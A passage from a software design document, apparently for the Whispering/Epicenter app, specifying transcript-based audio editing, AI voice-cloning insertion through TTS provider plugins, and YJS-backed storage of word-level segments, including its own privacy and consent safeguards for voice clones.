// ═══════════════════════════════════════════════════════════════════

type Play = { type: 'PLAY' };
type Pause = { type: 'PAUSE' };
type Seek = { type: 'SEEK'; time: number };
type PlaybackTimeUpdate = { type: 'PLAYBACK_TIME_UPDATE'; time: number };

// ═══════════════════════════════════════════════════════════════════
// UNDO/REDO
// ═══════════════════════════════════════════════════════════════════

type Undo = { type: 'UNDO' };
type Redo = { type: 'REDO' };

// ═══════════════════════════════════════════════════════════════════
// EXPORT
// ═══════════════════════════════════════════════════════════════════

type ExportRequest = {
	type: 'EXPORT_REQUEST';
	format: 'mp3' | 'wav' | 'mp4' | 'webm';
	selection?: { startIndex: number; length: number }; // or whole doc
	includeSubtitles?: boolean;
};

type ExportProgress = {
	type: 'EXPORT_PROGRESS';
	progress: number; // 0-1
};

type ExportComplete = {
	type: 'EXPORT_COMPLETE';
	outputPath: string;
};
```

### Editor State

```typescript
interface EditorState {
	// Document
	document: EditableDocument;

	// Cursor (two modes like Audapolis)
	cursor: {
		userIndex: number; // User-placed cursor position
		playerTime: number; // Playback position
		current: 'user' | 'player';
	};

	// Selection
	selection: {
		startIndex: number;
		length: number;
		headPosition: 'left' | 'right'; // For shift+arrow
	} | null;

	// Playback
	playing: boolean;

	// Undo stack
	undoStack: EditableDocument[];
	redoStack: EditableDocument[];

	// Export
	exportState: {
		running: boolean;
		progress: number;
	};
}
```

### FFmpeg Export Pipeline

```typescript
async function exportAudio(
	renderItems: RenderItem[],
	sources: Record<string, Source>,
	outputPath: string,
	onProgress: (p: number) => void,
): Promise<void> {
	const tempDir = await createTempDir();

	// Create FFmpeg inputs for each render item
	const inputs = renderItems.map((item, i) => {
		if (item.type === 'media') {
			const sourcePath = path.join(tempDir, `source_${item.source}`);
			await writeFile(sourcePath, sources[item.source].blob);

			return {
				path: sourcePath,
				options: {
					ss: item.sourceStart.toString(), // Start time
					t: item.length.toString(), // Duration
				},
			};
		} else {
			// Generate silence with FFmpeg filter
			return {
				filter: 'anullsrc',
				options: { duration: item.length },
			};
		}
	});

	// Concatenate all segments
	await ffmpegConcat(inputs, outputPath, onProgress);

	await cleanupTempDir(tempDir);
}
```

### Transcription Integration

The transcription service must return word-level timestamps:

```typescript
// Enhanced TranscriptFinal (updates Section 15)
type TranscriptFinal = {
	type: 'TRANSCRIPT_FINAL';
	sessionId: string;
	text: string; // Plain text for display/copy
	segments: TranscriptSegment[]; // Word-level data for editing
	sourceId: string; // Reference to stored audio
};

type TranscriptSegment = {
	word: string;
	start: number; // Start time in source
	end: number; // End time in source
	confidence: number;
	type: 'word' | 'punctuation' | 'non_speech';
};

// Conversion to document items
function transcriptToDocument(
	transcript: TranscriptFinal,
	speaker: string,
): DocumentItem[] {
	const items: DocumentItem[] = [
		{ type: 'paragraph_start', speaker, language: null, uuid: nanoid() },
	];

	for (const segment of transcript.segments) {
		if (segment.type === 'word') {
			items.push({
				type: 'text',
				uuid: nanoid(),
				source: transcript.sourceId,
				sourceStart: segment.start,
				length: segment.end - segment.start,
				text: segment.word,
				conf: segment.confidence,
			});
		} else if (segment.type === 'non_speech') {
			items.push({
				type: 'non_text',
				uuid: nanoid(),
				source: transcript.sourceId,
				sourceStart: segment.start,
				length: segment.end - segment.start,
			});
		}
	}

	items.push({ type: 'paragraph_end', uuid: nanoid() });
	return items;
}
```

### File Format

Documents saved as ZIP (like Audapolis):

```
recording.audapolis (ZIP)
├── document.json          # Document structure
├── metadata.json          # Display settings, version
└── sources/
    ├── abc123             # Original audio (by hash)
    ├── def456             # Another source
    └── gen_xyz789         # Generated audio (Section 17)
```

Benefits:

- **Non-destructive:** Original media always preserved
- **Portable:** Single file contains everything
- **Efficient:** Sources stored once, referenced many times

---

## Generative Audio Insertion (AI Voice Synthesis)

### Overview

Generative audio insertion allows users to add or modify spoken words using AI-generated speech. Edit the transcript text beyond what was originally spoken, and AI synthesizes the new audio in the speaker's voice.

```
Original: "Hello my name is Claude and I love coding"
                                              ↓
User edits: "Hello my name is Claude and I love Svelte"
                                                 ↑
                                         No source audio exists!
                                              ↓
AI generates: Voice clone speaks "Svelte" → new audio segment
                                              ↓
Final: Original audio seamlessly spliced with AI "Svelte"
```

### New Document Item Type

```typescript
interface GeneratedTextItem {
	type: 'generated_text';
	uuid: string;
	text: string;

	// Voice configuration
	voice: string; // Voice ID or clone reference
	style?: string; // "neutral", "excited", "sad", etc.

	// Generated audio (populated after synthesis)
	generatedSource?: string; // Hash of generated audio blob
	length?: number; // Duration (known after generation)

	// Status tracking
	status: 'pending' | 'generating' | 'generated' | 'failed';
	error?: string; // Error message if failed
}
```

### Updated Document Model

```typescript
type DocumentItem =
	| ParagraphStartItem
	| ParagraphEndItem
	| TextItem
	| NonTextItem
	| ArtificialSilenceItem
	| GeneratedTextItem; // ← NEW
```

### Visual Representation

```
┌─────────────────────────────────────────────────────────────────────────┐
│  DOCUMENT TIMELINE WITH GENERATED TEXT                                   │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  ┌──────┬──────┬──────┬──────┬──────┬────────┬───────────────────────┐  │
│  │Hello │  my  │ name │  is  │Claude│  and   │ I love                │  │
│  │ SRC  │ SRC  │ SRC  │ SRC  │ SRC  │  SRC   │ SRC                   │  │
│  │ 0.3s │ 0.2s │ 0.3s │ 0.2s │ 0.4s │  0.3s  │ 0.4s                  │  │
│  └──────┴──────┴──────┴──────┴──────┴────────┴───────────────────────┘  │
│                                                                          │
│  ┌──────────┐                                                            │
│  │  Svelte  │  type: 'generated_text'                                   │
│  │   GEN    │  status: 'pending' → 'generating' → 'generated'           │
│  │   0.4s   │  (duration estimated, then actual after synthesis)        │
│  └──────────┘                                                            │
│       ↑                                                                  │
│       │ UI indicator: different background, ⚡ icon                      │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### Voice Synthesizer Actor

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    VOICE SYNTH ACTOR TOPOLOGY                            │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  Editor Actor                                                            │
│       │                                                                  │
│       │ SYNTHESIZE_REQUEST                                               │
│       ▼                                                                  │
│  ┌─────────────────────────────────────────┐                             │
│  │         Voice Synthesizer Actor          │                            │
│  │                                          │                            │
│  │  • Manages TTS provider plugins          │                            │
│  │  • Handles voice cloning                 │                            │
│  │  • Caches generated audio                │                            │
│  │  • Queues synthesis requests             │                            │
│  └──────────────────┬──────────────────────┘                             │
│                     │                                                    │
│        ┌────────────┼────────────┐                                       │
│        ▼            ▼            ▼                                       │
│  ┌──────────┐ ┌──────────┐ ┌──────────┐                                  │
│  │ElevenLabs│ │  PlayHT  │ │  Local   │  ← TTS Provider Plugins          │
│  │ Plugin   │ │  Plugin  │ │  (Coqui) │    (Tier 1: sandboxed iframe)    │
│  └──────────┘ └──────────┘ └──────────┘                                  │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### Voice Synth Message Protocol

```typescript
// ═══════════════════════════════════════════════════════════════════
// EDITOR → VOICE SYNTH
// ═══════════════════════════════════════════════════════════════════

type SynthesizeRequest = {
	type: 'SYNTHESIZE_REQUEST';
	itemUuid: string; // Which generated_text item
	text: string; // What to synthesize
	voice: string; // Voice ID or clone ID
	style?: string; // Emotion/style hint
	context?: {
		precedingText?: string; // For better prosody
		followingText?: string;
		precedingAudio?: Blob; // For voice matching
	};
};

type CloneVoiceRequest = {
	type: 'CLONE_VOICE_REQUEST';
	speaker: string; // Speaker name
	samples: Blob[]; // Audio samples (30+ seconds recommended)
	language?: string;
};

type CancelSynthesis = {
	type: 'CANCEL_SYNTHESIS';
	itemUuid: string;
};

// ═══════════════════════════════════════════════════════════════════
// VOICE SYNTH → EDITOR
// ═══════════════════════════════════════════════════════════════════

type SynthesisProgress = {
	type: 'SYNTHESIS_PROGRESS';
	itemUuid: string;
	progress: number; // 0-1
};

type SynthesisComplete = {
	type: 'SYNTHESIS_COMPLETE';
	itemUuid: string;
	audioBlob: Blob;
	duration: number;
	sourceId: string; // Hash for storage
};

type SynthesisFailed = {
	type: 'SYNTHESIS_FAILED';
	itemUuid: string;
	error: string;
	retryable: boolean;
};

type VoiceCloneComplete = {
	type: 'VOICE_CLONE_COMPLETE';
	speaker: string;
	voiceId: string; // Provider's voice ID
	provider: string; // Which TTS provider
};

type VoiceCloneFailed = {
	type: 'VOICE_CLONE_FAILED';
	speaker: string;
	error: string;
};
```

### TTS Provider Plugin Interface

```typescript
// Plugin manifest
{
  "id": "tts-elevenlabs",
  "name": "ElevenLabs Voice Synthesis",
  "capabilities": {
    "network": ["api.elevenlabs.io"],
    "voice:synthesize": true,
    "voice:clone": true
  },
  "provides": {
    "voiceSynthServices": [{
      "id": "elevenlabs",
      "name": "ElevenLabs",
      "features": ["clone", "multilingual", "styles", "streaming"]
    }]
  }
}

// Plugin implementation
definePlugin({
  // Synthesize speech
  async synthesize(request: {
    text: string;
    voiceId: string;
    style?: string;
    apiKey: string;
  }): Promise<{ audio: Blob; duration: number }> {
    const response = await fetch(
      `https://api.elevenlabs.io/v1/text-to-speech/${request.voiceId}`,
      {
        method: 'POST',
        headers: {
          'xi-api-key': request.apiKey,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          text: request.text,
          model_id: 'eleven_multilingual_v2',
          voice_settings: {
            stability: 0.5,
            similarity_boost: 0.75,
            style: request.style === 'excited' ? 0.8 : 0.5
          }
        })
      }
    );

    const audio = await response.blob();
    const duration = await getAudioDuration(audio);
    return { audio, duration };
  },

  // Clone a voice from samples
  async cloneVoice(request: {
    name: string;
    samples: Blob[];
    apiKey: string;
  }): Promise<{ voiceId: string }> {
    const formData = new FormData();
    formData.append('name', request.name);
    request.samples.forEach((sample, i) => {
      formData.append('files', sample, `sample_${i}.wav`);
    });

    const response = await fetch(
      'https://api.elevenlabs.io/v1/voices/add',
      {
        method: 'POST',
        headers: { 'xi-api-key': request.apiKey },
        body: formData
      }
    );

    const data = await response.json();
    return { voiceId: data.voice_id };
  },

  // List available voices (stock + cloned)
  async listVoices(apiKey: string): Promise<Voice[]> {
    // ...
  }
});
```

### Available TTS Providers

| Provider        | Voice Cloning | Quality   | Latency | Price | Local Option |
| --------------- | ------------- | --------- | ------- | ----- | ------------ |
| **ElevenLabs**  | Yes (instant) | Excellent | ~1-2s   | $$    | No           |
| **PlayHT**      | Yes           | Very Good | ~2-3s   | $$    | No           |
| **Resemble.AI** | Yes           | Very Good | ~2s     | $$    | No           |
| **OpenAI TTS**  | No (stock)    | Excellent | ~1s     | $     | No           |
| **Coqui XTTS**  | Yes           | Good      | ~5s     | Free  | **Yes**      |
| **Piper**       | No (stock)    | Good      | <1s     | Free  | **Yes**      |

### Voice Cloning Workflow

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    VOICE CLONING WORKFLOW                                │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  1. USER RECORDS/IMPORTS AUDIO                                          │
│     • Transcription generates word-level timestamps                     │
│     • Speaker identified (manual or diarization)                        │
│                                                                          │
│  2. AUTOMATIC SAMPLE EXTRACTION                                         │
│     • System identifies clean speech segments                           │
│     • Filters out: noise, overlapping speech, music                     │
│     • Collects 30+ seconds of good samples                              │
│                                                                          │
│  3. VOICE CLONE CREATION (user-initiated)                               │
│     • User clicks "Clone Voice" for speaker                             │
│     • Samples sent to TTS provider                                      │
│     • Returns voice_id stored in document:                              │
│       speakers['Alice'].voiceCloneId = 'voice_abc123'                   │
│                                                                          │
│  4. USER EDITS TEXT                                                      │
│     • System detects new/modified words                                 │
│     • Creates generated_text items with status: 'pending'               │
│     • UI shows "Generate" button or auto-generates                      │
│                                                                          │
│  5. SYNTHESIS                                                            │
│     • Voice Synth Actor processes queue                                 │
│     • Calls TTS plugin with cloned voice                                │
│     • Updates document with generated audio                             │
│                                                                          │
│  6. PLAYBACK/EXPORT                                                      │
│     • Generated audio treated as regular source                         │
│     • Seamless playback with original audio                             │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### RenderItems with Generated Audio

```typescript
function computeRenderItems(content: DocumentItem[]): RenderItem[] {
	const items: RenderItem[] = [];
	let currentTime = 0;

	for (const item of content) {
		if (item.type === 'text' || item.type === 'non_text') {
			// Original audio - unchanged
			items.push({
				type: 'media',
				source: item.source,
				sourceStart: item.sourceStart,
				length: item.length,
				absoluteStart: currentTime,
			});
			currentTime += item.length;
		} else if (item.type === 'generated_text') {
			if (item.status === 'generated' && item.generatedSource) {
				// AI-generated audio (treat same as regular media)
				items.push({
					type: 'media',
					source: item.generatedSource,
					sourceStart: 0, // Generated audio starts at 0
					length: item.length!,
					absoluteStart: currentTime,
				});
				currentTime += item.length!;
			} else {
				// Not yet generated - render as silence placeholder
				const estimatedLength = estimateDuration(item.text);
				items.push({
					type: 'silence',
					length: estimatedLength,
					absoluteStart: currentTime,
				});
				currentTime += estimatedLength;
			}
		}
		// ... other types
	}

	return items;
}

function estimateDuration(text: string): number {
	// Rough estimate: ~0.3 seconds per word, ~0.1 per syllable
	const words = text.split(/\s+/).length;
	return words * 0.35;
}
```

### Text Edit Detection

```typescript
type EditDetectionResult =
	| { type: 'deletion'; indices: number[] }
	| { type: 'modification'; items: ModifiedItem[] }
	| { type: 'insertion'; text: string; position: number }
	| { type: 'structural' };

interface ModifiedItem {
	uuid: string;
	originalText: string;
	newText: string;
	needsGeneration: boolean;
}

function detectEdits(
	before: DocumentItem[],
	after: DocumentItem[],
	editRange: { start: number; end: number },
): EditDetectionResult {
	// Compare documents to determine what changed

	// Case 1: Pure deletion (no new text)
	if (isOnlyDeletion(before, after)) {
		return { type: 'deletion', indices: getDeletedIndices(before, after) };
	}

	// Case 2: Text modification (word changed)
	const modified = findModifiedText(before, after);
	if (modified.length > 0) {
		return {
			type: 'modification',
			items: modified.map((m) => ({
				uuid: m.uuid,
				originalText: m.before,
				newText: m.after,
				needsGeneration: true,
			})),
		};
	}

	// Case 3: New text inserted
	const inserted = findInsertedText(before, after);
	if (inserted) {
		return {
			type: 'insertion',
			text: inserted.text,
			position: inserted.position,
		};
	}

	return { type: 'structural' };
}

// When user types new text, convert to generated_text items
function insertGeneratedText(
	document: EditableDocument,
	text: string,
	position: number,
	speaker: string,
): EditableDocument {
	const words = text.split(/\s+/).filter((w) => w.length > 0);
	const voiceId = document.speakers?.[speaker]?.voiceCloneId;

	const newItems: GeneratedTextItem[] = words.map((word) => ({
		type: 'generated_text',
		uuid: nanoid(),
		text: word,
		voice: voiceId || 'default',
		status: 'pending',
	}));

	return {
		...document,
		content: [
			...document.content.slice(0, position),
			...newItems,
			...document.content.slice(position),
		],
	};
}
```

### UI Considerations

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    EDITOR UI WITH GENERATED TEXT                         │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  Transcript Display:                                                     │
│  ┌─────────────────────────────────────────────────────────────────┐    │
│  │ Hello my name is Claude and I love ⚡[Svelte]                    │    │
│  │                                     └───┬───┘                    │    │
│  │                            Generated text indicator              │    │
│  └─────────────────────────────────────────────────────────────────┘    │
│                                                                          │
│  Status Indicators:                                                      │
│  ┌─────────────────────────────────────────────────────────────────┐    │
│  │  Original text      │  Normal styling                           │    │
│  │  ⚡ Pending          │  Dashed border, yellow background         │    │
│  │  ⏳ Generating       │  Spinner, progress bar                    │    │
│  │  ✓ Generated        │  Solid border, light blue background      │    │
│  │  ✗ Failed           │  Red border, "Retry" button               │    │
│  └─────────────────────────────────────────────────────────────────┘    │
│                                                                          │
│  Context Menu (on generated text):                                       │
│  ┌─────────────────────────┐                                             │
│  │ ▶ Preview              │                                             │
│  │ ↻ Regenerate           │                                             │
│  │ 🎭 Change Style...     │ → Neutral, Excited, Sad, Whisper            │
│  │ 🗑 Delete               │                                             │
│  │ ↩ Revert to Original   │ (if was a modification)                     │
│  └─────────────────────────┘                                             │
│                                                                          │
│  Voice Clone Panel:                                                      │
│  ┌─────────────────────────────────────────────────────────────────┐    │
│  │  Speaker: Alice                                                  │    │
│  │  Voice Clone: ✓ Created (ElevenLabs)                            │    │
│  │  Sample Duration: 45 seconds                                     │    │
│  │  [Test Voice] [Re-clone] [Delete Clone]                         │    │
│  └─────────────────────────────────────────────────────────────────┘    │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### Privacy & Security Considerations

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    PRIVACY & SECURITY                                    │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  VOICE DATA IS HIGHLY SENSITIVE                                         │
│                                                                          │
│  Risks:                                                                  │
│  • Voice clones enable impersonation and fraud                          │
│  • Audio samples sent to third-party APIs                               │
│  • Generated audio could be misused (deepfakes)                         │
│  • Voice biometrics are personally identifiable                         │
│                                                                          │
│  Mitigations:                                                            │
│                                                                          │
│  1. EXPLICIT CONSENT                                                     │
│     • Prominent warning before first voice clone                        │
│     • "I understand this creates an AI clone of my voice"               │
│     • Consent stored in document metadata                               │
│                                                                          │
│  2. LOCAL-FIRST OPTION                                                   │
│     • Coqui XTTS plugin for fully offline voice cloning                 │
│     • No data leaves device                                             │
│     • Recommended for sensitive content                                 │
│                                                                          │
│  3. CLEAR LABELING                                                       │
│     • Generated audio visually distinguished in UI                      │
│     • Export option to embed "AI-generated" metadata                    │
│     • Optional audio watermarking                                       │
│                                                                          │
│  4. CAPABILITY RESTRICTIONS                                              │
│     • "voice:clone" is explicit plugin capability                       │
│     • User approves which plugins can clone voices                      │
│     • Audit log of voice clone operations                               │
│                                                                          │
│  5. PROVIDER SELECTION                                                   │
│     • Settings to choose TTS provider                                   │
│     • "None" option disables voice synthesis entirely                   │
│     • Per-project provider override                                     │
│                                                                          │
│  Plugin Capabilities:                                                    │
│  {                                                                       │
│    "voice:synthesize": true,  // Generate speech from text              │
│    "voice:clone": true        // Create voice clones (sensitive!)       │
│  }                                                                       │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### Document Metadata for Voice Clones

```typescript
interface EditableDocument {
	content: DocumentItem[];
	sources: Record<string, Source>;
	metadata: {
		displaySpeakerNames: boolean;
		displayVideo: boolean;
	};

	// Voice clone data
	speakers?: Record<string, SpeakerData>;
}

interface SpeakerData {
	name: string;
	language?: string;

	// Voice cloning
	voiceCloneId?: string; // Provider's voice ID
	voiceCloneProvider?: string; // Which TTS provider
	voiceCloneCreatedAt?: number; // Timestamp
	voiceCloneConsent?: {
		givenAt: number;
		givenBy: string; // User identifier
	};

	// Sample tracking
	sampleSegments?: Array<{
		sourceId: string;
		start: number;
		end: number;
	}>;
}
```

### Implementation Phases

| Phase | Scope                                 | Dependencies          |
| ----- | ------------------------------------- | --------------------- |
| **1** | Text-based editing (Section 16)       | Word-level timestamps |
| **2** | Voice Synth Actor + plugin interface  | Phase 1               |
| **3** | Stock voice TTS (OpenAI, Piper)       | Phase 2               |
| **4** | Voice cloning (ElevenLabs plugin)     | Phase 3               |
| **5** | Local voice cloning (Coqui XTTS)      | Phase 4               |
| **6** | Advanced features (styles, streaming) | Phase 5               |

---

## Epicenter Vault Integration

### Overview

This section analyzes how text-based media editing integrates with the Epicenter Vault architecture, specifically the new YJS-backed workspace system in `feat/epicenter-app` branch.

### Current Vault Architecture (main branch)

The current Whispering vault uses markdown files with YAML frontmatter:

```
recordings/
├── {id}.md          ← Metadata (YAML) + transcribed text (body)
└── {id}.webm        ← Audio file (separate)
```

**Recording structure:**

```markdown
---
id: abc123
title: Meeting Notes
subtitle: Quick note
timestamp: 2025-10-28T10:30:00Z
createdAt: 2025-10-28T10:30:00Z
updatedAt: 2025-10-28T10:35:00Z
transcriptionStatus: DONE
---

Hello my name is Claude and I love coding.
```

**Limitations for text-based editing:**

- `transcribedText` is plain string (no word-level data)
- No segment/timestamp information stored
- YAML frontmatter would become unwieldy with thousands of word segments
- No built-in collaboration support

### New Vault Architecture (feat/epicenter-app)

The `feat/epicenter-app` branch introduces a YJS-backed workspace system with typed fields:

```typescript
// Field types available
id(); // Primary key
text(); // String
select(); // Enum
boolean(); // Boolean
integer(); // Number (int)
real(); // Number (float)
date(); // DateTime
tags(); // String array
richtext(); // Collaborative rich text (separate Y.Doc)
json(); // Arbitrary JSON with TypeBox schema  ← KEY ENABLER!
```

**The `json` field type is the key enabler for text-based editing** - it can store arbitrary structured data with full type safety via TypeBox schemas.

### Current Whispering Template

```typescript
// apps/epicenter/src/lib/templates/whispering.ts (feat/epicenter-app)
export const WHISPERING_TEMPLATE = {
	id: 'epicenter.whispering',
	name: 'Whispering',
	tables: {
		recordings: table({
			name: 'Recordings',
			icon: '🎙️',
			description: 'Voice recordings and transcriptions',
			fields: {
				id: id(),
				title: text({ name: 'Title' }),
				subtitle: text({ name: 'Subtitle' }),
				timestamp: text({ name: 'Timestamp' }),
				createdAt: text({ name: 'Created At' }),
				updatedAt: text({ name: 'Updated At' }),
				transcribedText: text({ name: 'Transcribed Text' }), // Still plain text!
				transcriptionStatus: select({
					name: 'Status',
					options: ['UNPROCESSED', 'TRANSCRIBING', 'DONE', 'FAILED'],
				}),
			},
		}),
	},
	kv: {},
} as const;
```

**Gap:** No `segments` field for word-level data yet.

### Enhanced Template for Text-Based Editing

```typescript
import { Type } from 'typebox';
import { id, text, select, boolean, json, table } from '@epicenter/hq';

// ═══════════════════════════════════════════════════════════════════
// TYPEBOX SCHEMAS FOR DOCUMENT ITEMS
// ═══════════════════════════════════════════════════════════════════

const ParagraphStartSchema = Type.Object({
	type: Type.Literal('paragraph_start'),
	uuid: Type.String(),
	speaker: Type.String(),
	language: Type.Union([Type.String(), Type.Null()]),
});

const ParagraphEndSchema = Type.Object({
	type: Type.Literal('paragraph_end'),
	uuid: Type.String(),
});

const TextItemSchema = Type.Object({
	type: Type.Literal('text'),
	uuid: Type.String(),
	source: Type.String(), // Recording ID (references audio file)
	sourceStart: Type.Number(), // Start time in source (seconds)
	length: Type.Number(), // Duration (seconds)
	text: Type.String(), // Transcribed word
	conf: Type.Number(), // Confidence (0-1)
});

const NonTextItemSchema = Type.Object({
	type: Type.Literal('non_text'),
	uuid: Type.String(),
	source: Type.String(),
	sourceStart: Type.Number(),
	length: Type.Number(),
});

const ArtificialSilenceSchema = Type.Object({
	type: Type.Literal('artificial_silence'),
	uuid: Type.String(),
	length: Type.Number(),
});

const GeneratedTextSchema = Type.Object({
	type: Type.Literal('generated_text'),
	uuid: Type.String(),
	text: Type.String(),
	voice: Type.String(),
	style: Type.Optional(Type.String()),
	generatedSource: Type.Optional(Type.String()),
	length: Type.Optional(Type.Number()),
	status: Type.Union([
		Type.Literal('pending'),
		Type.Literal('generating'),
		Type.Literal('generated'),
		Type.Literal('failed'),
	]),
});

const DocumentItemSchema = Type.Union([
	ParagraphStartSchema,
	ParagraphEndSchema,
	TextItemSchema,
	NonTextItemSchema,
	ArtificialSilenceSchema,
	GeneratedTextSchema,
]);

const SpeakerDataSchema = Type.Object({
	name: Type.String(),
	language: Type.Optional(Type.String()),
	voiceCloneId: Type.Optional(Type.String()),
	voiceCloneProvider: Type.Optional(Type.String()),
	voiceCloneCreatedAt: Type.Optional(Type.Number()),
});

// ═══════════════════════════════════════════════════════════════════
// ENHANCED WHISPERING TEMPLATE
// ═══════════════════════════════════════════════════════════════════

export const WHISPERING_TEMPLATE = {
	id: 'epicenter.whispering',
	name: 'Whispering',
	tables: {
		recordings: table({
			name: 'Recordings',
			icon: '🎙️',
			description: 'Voice recordings and transcriptions',
			fields: {
				id: id(),
				title: text({ name: 'Title' }),
				subtitle: text({ name: 'Subtitle' }),
				timestamp: text({ name: 'Timestamp' }),
				createdAt: text({ name: 'Created At' }),
				updatedAt: text({ name: 'Updated At' }),

				// ─────────────────────────────────────────────────────────
				// LEGACY: Plain text (backwards compat, search, copy)
				// ─────────────────────────────────────────────────────────
				transcribedText: text({ name: 'Transcribed Text' }),
				transcriptionStatus: select({
					name: 'Status',
					options: ['UNPROCESSED', 'TRANSCRIBING', 'DONE', 'FAILED'],
				}),

				// ─────────────────────────────────────────────────────────
				// NEW: Word-level segments for text-based editing
				// ─────────────────────────────────────────────────────────
				segments: json({
					name: 'Segments',
					description: 'Word-level transcript with source references',
					schema: Type.Array(DocumentItemSchema),
					nullable: true, // null = legacy recording without segments
				}),

				// ─────────────────────────────────────────────────────────
				// NEW: Speaker data for voice synthesis
				// ─────────────────────────────────────────────────────────
				speakers: json({
					name: 'Speakers',
					description: 'Speaker metadata and voice clone references',
					schema: Type.Record(Type.String(), SpeakerDataSchema),
					nullable: true,
				}),

				// ─────────────────────────────────────────────────────────
				// NEW: Project mode flag
				// ─────────────────────────────────────────────────────────
				isProject: boolean({
					name: 'Is Project',
					description: 'True if recording has been opened for editing',
					default: false,
				}),
			},
		}),
	},
	kv: {},
} as const;
```

### Storage Architecture

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    ENHANCED STORAGE ARCHITECTURE                         │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  {appDataDir}/                                                          │
│  └── workspaces/                                                        │
│      └── {workspace-guid}/                                              │
│          │                                                              │
│          │   # YJS Documents (structured data)                          │
│          ├── definition.json      # Workspace schema                    │
│          ├── head.yjs             # Current epoch                       │
│          └── 0.yjs                # Workspace data (recordings table)   │
│                                                                          │
│  {appDataDir}/                                                          │
│  └── recordings/                  # Audio files (binary, separate)      │
│      ├── {id}.webm                # Original recording audio            │
│      ├── {id}.webm                # Another recording                   │
│      └── {id}.generated/          # AI-generated audio clips            │
│          ├── gen_abc123.webm                                            │
│          └── gen_def456.webm                                            │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

**Key design decisions:**

1. **Structured data in YJS** - Recording metadata + segments stored in YJS workspace
2. **Audio files separate** - Binary audio remains in file system (not in YJS)
3. **Generated audio in subdirectory** - AI-generated clips stored per-recording
4. **Source references** - Segments point to recording IDs (audio file lookup)

### Data Flow

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    RECORDING → PROJECT DATA FLOW                         │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  1. INITIAL RECORDING                                                   │
│     ┌──────────────────────────────────────────────┐                    │
│     │ Recording {                                   │                    │
│     │   id: 'abc123',                              │                    │
│     │   title: 'Meeting Notes',                    │                    │
│     │   transcriptionStatus: 'DONE',               │                    │
│     │   transcribedText: 'Hello my name is...',   │                    │
│     │   segments: null,        ← No word data yet  │                    │
│     │   isProject: false,                          │                    │
│     │ }                                            │                    │
│     └──────────────────────────────────────────────┘                    │
│                          │                                               │
│                          │ User clicks "Edit as Project"                 │
│                          ▼                                               │
│  2. RE-TRANSCRIBE WITH TIMESTAMPS                                       │
│     ┌──────────────────────────────────────────────┐                    │
│     │ Transcription service returns:               │                    │
│     │ {                                            │                    │
│     │   text: 'Hello my name is Claude',           │                    │
│     │   segments: [                                │                    │
│     │     { word: 'Hello', start: 0.0, end: 0.3 }, │                    │
│     │     { word: 'my', start: 0.3, end: 0.5 },    │                    │
│     │     ...                                      │                    │
│     │   ]                                          │                    │
│     │ }                                            │                    │
│     └──────────────────────────────────────────────┘                    │
│                          │                                               │
│                          │ Convert to document items                     │
│                          ▼                                               │
│  3. EDITABLE PROJECT                                                    │
│     ┌──────────────────────────────────────────────┐                    │
│     │ Recording {                                   │                    │
│     │   id: 'abc123',                              │                    │
│     │   title: 'Meeting Notes',                    │                    │
│     │   transcriptionStatus: 'DONE',               │                    │
│     │   transcribedText: 'Hello my name is...',   │                    │
│     │   segments: [              ← Word-level data │                    │
│     │     { type: 'paragraph_start', speaker: 'User', ... },           │
│     │     { type: 'text', text: 'Hello', source: 'abc123',             │
│     │       sourceStart: 0.0, length: 0.3, ... },                      │
│     │     { type: 'text', text: 'my', source: 'abc123',                │
│     │       sourceStart: 0.3, length: 0.2, ... },                      │
│     │     ...                                      │                    │
│     │   ],                                         │                    │
│     │   isProject: true,        ← Now a project    │                    │
│     │ }                                            │                    │
│     └──────────────────────────────────────────────┘                    │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### Comparison: Current vs Enhanced

| Aspect               | Current (main)   | Enhanced (feat/epicenter-app)    |
| -------------------- | ---------------- | -------------------------------- |
| **Storage format**   | Markdown + YAML  | YJS workspace + JSON fields      |
| **Word-level data**  | Not supported    | `json` field with TypeBox schema |
| **Type safety**      | Manual parsing   | Full TypeScript inference        |
| **Collaboration**    | Not supported    | YJS built-in                     |
| **Schema evolution** | Manual migration | Epoch-based migrations           |
| **Audio storage**    | File system      | File system (unchanged)          |
| **Query capability** | File system scan | YJS + optional SQLite            |

### Benefits of YJS Integration

1. **Real-time collaboration** - Multiple users can edit transcript simultaneously
2. **Offline-first** - YJS handles sync when connection restored
3. **Type safety** - TypeBox schemas provide runtime validation
4. **Efficient updates** - YJS only syncs changed segments, not entire document
5. **Undo/redo** - YJS UndoManager provides built-in history

### Audio File Handling

Audio files remain separate from YJS storage (binary data not suitable for CRDTs):

```typescript
// Audio storage interface (unchanged from current)
interface AudioStorage {
	// Save audio blob
	saveAudio(recordingId: string, audio: Blob): Promise<void>;

	// Get audio for playback
	getAudioBlob(recordingId: string): Promise<Blob | null>;

	// Get playback URL
	getAudioUrl(recordingId: string): Promise<string>;

	// NEW: Save generated audio clip
	saveGeneratedAudio(
		recordingId: string,
		generatedId: string,
		audio: Blob,
	): Promise<void>;

	// NEW: Get generated audio
	getGeneratedAudioBlob(
		recordingId: string,
		generatedId: string,
	): Promise<Blob | null>;
}
```

### Migration Path

```typescript
// Migration from legacy recording to editable project
async function migrateToProject(recordingId: string): Promise<void> {
	const workspace = getWhisperingWorkspace();
	const recording = workspace.tables.recordings.get({ id: recordingId });

	if (recording.status !== 'valid') {
		throw new Error('Recording not found');
	}

	// Skip if already a project
	if (recording.row.segments !== null) {
		return;
	}

	// 1. Get audio blob
